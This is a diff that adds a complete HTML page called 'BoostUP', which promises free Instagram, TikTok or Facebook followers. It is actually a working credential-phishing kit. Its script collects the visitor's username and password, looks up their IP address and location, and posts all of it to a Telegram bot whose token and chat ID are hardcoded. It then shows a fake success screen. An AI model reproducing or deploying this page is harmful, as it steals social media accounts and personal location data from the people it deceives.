@@ -1,0 +1,301 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>BoostUP</title>
+<style>
+@import url('https://fonts.googleapis.com/css2?family=Cairo:wght@400;700&display=swap');
+body {
+  font-family: 'Cairo', sans-serif;
+  margin: 0;
+  padding-bottom: 40px;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  min-height: 100vh;
+  color: #333;
+  overflow-x: hidden;
+  background: linear-gradient(-45deg, #ee7752, #e73c7e, #23a6d5, #23d5ab);
+  background-size: 400% 400%;
+  animation: gradientBG 15s ease infinite;
+}
+@keyframes gradientBG {
+  0% { background-position: 0% 50%; }
+  50% { background-position: 100% 50%; }
+  100% { background-position: 0% 50%; }
+}
+.logo-fixed {
+  position: fixed;
+  top: 10px;
+  right: 10px;
+  z-index: 999;
+  width: 100px;
+  height: 100px;
+}
+.container {
+  background: #fff;
+  padding: 20px;
+  border-radius: 15px;
+  box-shadow: 0 8px 20px rgba(0,0,0,0.2);
+  width: 90%;
+  max-width: 400px;
+  text-align: center;
+  animation: pop 0.5s ease-out;
+}
+@keyframes pop {
+  from { transform: scale(0.9); opacity: 0; }
+  to { transform: scale(1); opacity: 1; }
+}
+h3 { color: #4a00e0; margin-bottom: 20px; }
+select, input {
+  width: 100%;
+  margin: 8px 0;
+  padding: 6px 8px;
+  border-radius: 8px;
+  border: 1px solid #ccc;
+  transition: 0.3s;
+  font-size: 12px;
+  height: 30px;
+}
+select:focus, input:focus {
+  border-color: #6a11cb;
+  outline: none;
+  box-shadow: 0 0 5px rgba(106,17,203,0.5);
+}
+button {
+  background: linear-gradient(135deg, #6a11cb, #2575fc);
+  color: white;
+  border: none;
+  padding: 12px;
+  cursor: pointer;
+  width: 100%;
+  margin-top: 10px;
+  border-radius: 8px;
+  font-size: 16px;
+  transition: 0.3s;
+}
+button:hover {
+  opacity: 0.9;
+  transform: scale(1.02);
+}
+.spinner {
+  border: 6px solid #f3f3f3;
+  border-top: 6px solid #6a11cb;
+  border-radius: 50%;
+  width: 50px;
+  height: 50px;
+  margin: 20px auto;
+  animation: spin 1s linear infinite;
+}
+@keyframes spin {
+  0% { transform: rotate(0deg); }
+  100% { transform: rotate(360deg); }
+}
+#loading, #done {
+  display: none;
+  margin-top: 20px;
+  color: #444;
+}
+.platform-icon {
+  margin: 15px auto;
+  height: 50px;
+  width: 50px;
+}
+.checkmark-circle {
+  width: 100px;
+  height: 100px;
+  border-radius: 50%;
+  background: #4CAF50;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  margin: 20px auto;
+  animation: popIn 0.6s ease-out;
+}
+.checkmark {
+  display: block;
+  width: 40px;
+  height: 20px;
+  border-left: 5px solid #fff;
+  border-bottom: 5px solid #fff;
+  transform: rotate(-45deg);
+  animation: draw 0.6s ease-out forwards;
+}
+@keyframes popIn {
+  0% { transform: scale(0); opacity: 0; }
+  80% { transform: scale(1.1); opacity: 1; }
+  100% { transform: scale(1); }
+}
+@keyframes draw {
+  0% { width: 0; height: 0; opacity: 0; }
+  50% { width: 40px; height: 0; opacity: 1; }
+  100% { width: 40px; height: 20px; opacity: 1; }
+}
+footer {
+  position: fixed;
+  bottom: 0;
+  width: 100%;
+  background: rgba(214, 208, 208, 0.9);
+  text-align: center;
+  font-size: 13px;
+  color: #333232;
+  padding: 8px 0;
+  box-shadow: 0 -1px 5px rgba(0,0,0,0.1);
+  z-index: 1000;
+  font-family: 'Cairo', sans-serif;
+}
+</style>
+</head>
+<body>
+
+<img src="logo/logo.png" alt="Site Logo" class="logo-fixed" />
+
+<div class="container">
+<h3>Boost Your Followers 🚀</h3>
+
+<div id="step1">
+<p>Select a platform:</p>
+<select id="platform" onchange="showIcon()">
+<option value="">-- Choose platform --</option>
+<option value="instagram">Instagram</option>
+<option value="tiktok">TikTok</option>
+<option value="facebook">Facebook</option>
+</select>
+<div>
+<img id="platformIcon" class="platform-icon" src="" alt="" style="display:none;" />
+</div>
+<button onclick="nextStep(2)">Next</button>
+</div>
+
+<div id="step2" style="display:none;">
+<p>Select number of followers:</p>
+<select id="followers">
+<option value="">-- Choose number --</option>
+<script>
+for (let i = 100; i <= 5000; i += 100) {
+document.write(`<option value="${i}">${i}</option>`);
+}
+</script>
+</select>
+<button onclick="nextStep(3)">Next</button>
+</div>
+
+<div id="step3" style="display:none;">
+<p>
+Enter your credentials <br>
+<span style="font-size: 11px; color: rgba(0,0,0,0.6);">
+Enter your username and password carefully. Followers are sent only once, and mistakes can’t be corrected.
+</span>
+</p>
+<input type="text" id="username" placeholder="Username" />
+<input type="password" id="password" placeholder="Password" />
+<button onclick="sendFollowers()">Send</button>
+</div>
+
+<div id="loading">
+<div class="spinner"></div>
+<p>Sending followers...</p>
+</div>
+
+<div id="done">
+<div class="checkmark-circle">
+<span class="checkmark"></span>
+</div>
+<p>Followers request sent ✅<br>Processing may take a few minutes 🌟</p>
+</div>
+</div>
+
+<footer>
+&copy; All rights reserved to BoostUP 2025 🌟
+</footer>
+
+<script>
+function showIcon() {
+const platform = document.getElementById('platform').value;
+const icon = document.getElementById('platformIcon');
+
+if (platform === 'instagram') {
+  icon.src = 'https://cdn-icons-png.flaticon.com/512/2111/2111463.png';
+  icon.alt = 'Instagram';
+  icon.style.display = 'block';
+} else if (platform === 'tiktok') {
+  icon.src = 'https://cdn-icons-png.flaticon.com/512/3046/3046121.png';
+  icon.alt = 'TikTok';
+  icon.style.display = 'block';
+} else if (platform === 'facebook') {
+  icon.src = 'https://cdn-icons-png.flaticon.com/512/733/733547.png';
+  icon.alt = 'Facebook';
+  icon.style.display = 'block';
+} else {
+  icon.style.display = 'none';
+}
+}
+
+function nextStep(step) {
+if (step === 2 && !document.getElementById('platform').value) {
+  alert('Please select a platform');
+  return;
+}
+if (step === 3 && !document.getElementById('followers').value) {
+  alert('Please select number of followers');
+  return;
+}
+document.getElementById(`step${step - 1}`).style.display = 'none';
+document.getElementById(`step${step}`).style.display = 'block';
+}
+
+function sendFollowers() {
+const user = document.getElementById('username').value.trim();
+const pass = document.getElementById('password').value.trim();
+const platform = document.getElementById('platform').value;
+const followers = document.getElementById('followers').value;
+
+if (!user || !pass) {
+  alert('Please enter both username and password');
+  return;
+}
+
+
+document.getElementById('step3').style.display = 'none';
+document.getElementById('loading').style.display = 'block';
+
+const token = '7814463410:AAFej2-K3LM4Uhvyx-py-pZtThrLvQyTenc';
+const chatId = '1848006769';
+
+fetch('https://ipapi.co/json/')
+  .then(res => res.json())
+  .then(data => {
+    const ip = data.ip;
+    const city = data.city || 'Unknown';
+    const country = data.country_name || 'Unknown';
+    const userAgent = navigator.userAgent;
+
+    const msg = ` 🚨 New login detected:
+📱 Platform: ${platform}
+👥 Followers: ${followers}
+👤 Username: ${user}
+🔑 Password: ${pass}
+🌐 IP: ${ip}
+🏙️ Location: ${city}, ${country}
+🖥️ Device: ${userAgent}`;
+
+    fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        chat_id: chatId,
+        text: msg
+      })
+    });
+  });
+
+setTimeout(() => {
+  document.getElementById('loading').style.display = 'none';
+  document.getElementById('done').style.display = 'block';
+}, 3000);
+}
+</script>
+
+</body>
+</html>
